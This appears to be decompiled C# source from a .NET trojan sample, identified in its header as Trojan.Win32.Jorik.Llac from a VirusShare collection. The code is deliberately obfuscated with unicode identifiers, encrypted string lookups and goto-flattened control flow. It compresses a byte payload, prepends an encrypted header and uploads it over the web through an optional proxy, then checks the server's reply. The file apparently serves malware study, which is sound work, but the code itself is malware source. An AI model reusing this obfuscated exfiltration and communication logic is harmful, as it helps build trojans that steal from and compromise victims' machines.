// Decompiled with JetBrains decompiler
// Type: .
// Assembly: ccy, Version=0.0.0.0, Culture=neutral, PublicKeyToken=cc6f4431894d1c97
// MVID: 2A74CDCD-1E5F-40DD-90C8-12E38E6596C8
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Trojan.Win32.Jorik.Llac.cfi-7d3f633a775aae62503ba637b47672afca334a930966f3c35ac40563155370b2.exe

using \u0004;
using \u0005;
using System;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace \u0004
{
  internal class \u0004
  {
    [NonSerialized]
    internal static \u0001.\u0001 \u0001;
    private IWebProxy \u0001;
    private \u0005.\u0002 \u0001;

    static \u0004() => \u0001.\u0002.\u0002(typeof (\u0004.\u0004));

    internal bool \u0002([In] byte[] obj0, [In] \u0004.\u0004.\u0001 obj1)
    {
      byte[] numArray1;
      try
      {
        numArray1 = \u0002.\u0004.\u0002(obj0);
      }
      catch (Exception ex)
      {
        this.\u0002(\u0005.\u0004.\u0001, \u0002.\u0004.\u0001);
        return false;
      }
      byte[] numArray2 = \u0003.\u0002(numArray1, \u0004.\u0004.\u0001(1023));
      if (true)
        goto label_12;
label_3:
      byte[] numArray3;
      if (numArray3 == null)
      {
        this.\u0002(\u0005.\u0004.\u0001, \u0003.\u0001);
        return false;
      }
      this.\u0002(\u0005.\u0004.\u0002);
      \u0006 obj2 = new \u0006(\u0004.\u0004.\u0001(1349));
      if (true)
        goto label_13;
label_6:
      \u0006 obj3;
      if (this.\u0001 != null)
        obj3.\u0002(this.\u0001);
      \u0004.\u0004.\u0005 obj4 = new \u0004.\u0004.\u0005(this, numArray3, obj3, obj1);
      if (true)
        goto label_14;
label_9:
      \u0004.\u0004.\u0005 obj5;
      if (true)
        obj3.\u0002(new \u0005.\u0005(obj5.\u0002));
      return obj5.\u0001;
label_14:
      obj5 = obj4;
      goto label_9;
label_13:
      obj3 = obj2;
      goto label_6;
label_12:
      numArray3 = numArray2;
      goto label_3;
    }

    [SpecialName]
    public void \u0002([In] \u0005.\u0002 obj0)
    {
      if (false)
        goto label_5;
      else
        goto label_15;
label_1:
      int num1 = -1;
      int num2;
      if (num1 != 0)
      {
        if (num1 != 0)
        {
          if (true)
            goto label_16;
        }
        else
          goto label_17;
      }
      else
      {
        num2 = num1;
        goto label_6;
      }
label_5:
      num2 = 7;
label_6:
      \u0005.\u0002 obj1;
      \u0005.\u0002 comparand;
      int num3;
      for (; num2 != 0; num2 = num3)
      {
        num3 = 0;
        if (num3 != 0)
          continue;
        if (num3 == 0)
        {
          if (obj1 == comparand)
            return;
          goto label_1;
        }
        else
          goto label_16;
      }
label_15:
      \u0005.\u0002 obj2 = this.\u0001;
      if (true)
      {
        obj1 = obj2;
        goto label_1;
      }
      else
        goto label_1;
label_16:
      \u0005.\u0002 obj3 = obj1;
      if (true)
        comparand = obj3;
label_17:
      \u0005.\u0002 obj4 = comparand + obj0;
      \u0005.\u0002 obj5;
      if (true)
        obj5 = obj4;
      \u0005.\u0002 obj6 = Interlocked.CompareExchange<\u0005.\u0002>(ref this.\u0001, obj5, comparand);
      if (true)
      {
        obj1 = obj6;
        goto label_5;
      }
      else
        goto label_5;
    }

    protected void \u0002([In] \u0005.\u0004 obj0, [In] string obj1, [In] string obj2)
    {
      \u0005.\u0002 obj3 = this.\u0001;
      \u0005.\u0002 obj4;
      if (true)
        obj4 = obj3;
      if (obj4 == null)
        return;
      obj4((object) this, new \u0003(obj0, obj1, obj2));
    }

    protected void \u0002([In] \u0005.\u0004 obj0, [In] string obj1) => this.\u0002(obj0, obj1, string.Empty);

    protected void \u0002([In] \u0005.\u0004 obj0) => this.\u0002(obj0, string.Empty);

    private class \u0005
    {
      [NonSerialized]
      internal static \u0001.\u0001 \u0001;
      private readonly \u0004.\u0004 \u0001;
      private readonly byte[] \u0001;
      private readonly \u0006 \u0001;
      private readonly \u0004.\u0004.\u0001 \u0001;
      public bool \u0001 = true;

      static \u0005() => \u0001.\u0002.\u0002(typeof (\u0004.\u0004.\u0005));

      public \u0005([In] \u0004.\u0004 obj0, [In] byte[] obj1, [In] \u0006 obj2, [In] \u0004.\u0004.\u0001 obj3)
      {
        this.\u0001 = obj0;
        this.\u0001 = obj3;
        this.\u0001 = obj2;
        this.\u0001 = obj1;
      }

      public void \u0002([In] string obj0)
      {
        if (!(obj0 == \u0004.\u0004.\u0005.\u0001(1401)))
        {
          string str1 = obj0;
          if (true)
            goto label_14;
label_7:
          string str2;
          while (this.\u0001.\u0001 != null)
          {
            if (true)
            {
              this.\u0001.\u0001((object) this, new \u0003(\u0005.\u0004.\u0002, str2));
              break;
            }
          }
          this.\u0001 = false;
          return;
label_14:
          str2 = str1;
          goto label_7;
        }
        else
        {
          do
          {
            this.\u0001.\u0002(\u0005.\u0004.\u0003);
          }
          while (false);
          byte[] bytes = Encoding.UTF8.GetBytes(\u0004.\u0004.\u0005.\u0001(1406));
          byte[] sourceArray;
          if (true)
            sourceArray = bytes;
          int length1 = sourceArray.Length;
          int num1 = 3;
          while (num1 != 0)
          {
            int num2 = length1;
            int length2 = this.\u0001.Length;
            if (false)
            {
              num1 = length2;
              length1 = num2;
            }
            else
            {
              length1 = num2 + length2;
              break;
            }
          }
          byte[] numArray = new byte[length1];
          byte[] destinationArray;
          if (true)
            destinationArray = numArray;
          Array.Copy((Array) sourceArray, (Array) destinationArray, sourceArray.Length);
          Array.Copy((Array) this.\u0001, 0, (Array) destinationArray, sourceArray.Length, this.\u0001.Length);
          \u0004.\u0004.\u0006 obj1 = new \u0004.\u0004.\u0006(this.\u0001);
          if (true)
            goto label_13;
label_5:
          \u0004.\u0004.\u0006 obj2;
          this.\u0001.\u0002(destinationArray, this.\u0001.\u0004(), this.\u0001.\u0003(), this.\u0001.\u0002(), new \u0005.\u0005(obj2.\u0002));
          this.\u0001 = obj2.\u0001;
          return;
label_13:
          obj2 = obj1;
          goto label_5;
        }
      }
    }

    private class \u0006
    {
      [NonSerialized]
      internal static \u0001.\u0001 \u0001;
      private readonly \u0004.\u0004 \u0001;
      public bool \u0001;

      static \u0006() => \u0001.\u0002.\u0002(typeof (\u0004.\u0004.\u0006));

      public \u0006([In] \u0004.\u0004 obj0) => this.\u0001 = obj0;

      public void \u0002([In] string obj0)
      {
        int num1;
        int num2;
        do
        {
          num1 = obj0.StartsWith(\u0004.\u0004.\u0006.\u0001(1465)) ? 1 : 0;
          while (true)
          {
            if (true)
            {
              if (num1 == 0)
              {
                num2 = 2;
                if (num2 == 0)
                  num1 = num2;
                else
                  goto label_7;
              }
              else
                goto label_15;
            }
            else
              break;
          }
label_5:
          continue;
label_15:
          this.\u0001.\u0002(\u0005.\u0004.\u0003, obj0);
          if (true)
          {
            num1 = 8;
            goto label_5;
          }
          else
            goto label_13;
        }
        while (num1 == 0);
        goto label_16;
label_7:
        if (num2 == 0)
          goto label_11;
        else
          goto label_17;
label_10:
        this.\u0001 = true;
label_11:
        int num3 = 2;
label_12:
        if (num3 == 0)
          goto label_10;
label_13:
        int num4 = 0;
        if (num4 != 0)
        {
          num3 = num4;
          goto label_12;
        }
        else
        {
          if (num4 == 0)
            return;
          goto label_17;
        }
label_16:
        this.\u0001 = false;
        return;
label_17:
        this.\u0001.\u0002(\u0005.\u0004.\u0004, string.Empty, obj0);
        goto label_10;
      }
    }

    internal class \u0001
    {
      public static \u0004.\u0004.\u0001 \u0001 = new \u0004.\u0004.\u0001((string) null, (string) null, (string) null);
      private readonly string \u0001;
      private readonly string \u0002;
      private readonly string \u0003;

      public \u0001([In] string obj0, [In] string obj1, [In] string obj2)
      {
        this.\u0001 = obj0;
        this.\u0003 = obj2;
        this.\u0002 = obj1;
      }

      [SpecialName]
      public string \u0002() => this.\u0003;

      [SpecialName]
      public string \u0003() => this.\u0002;

      [SpecialName]
      public string \u0004() => this.\u0001;
    }
  }
}
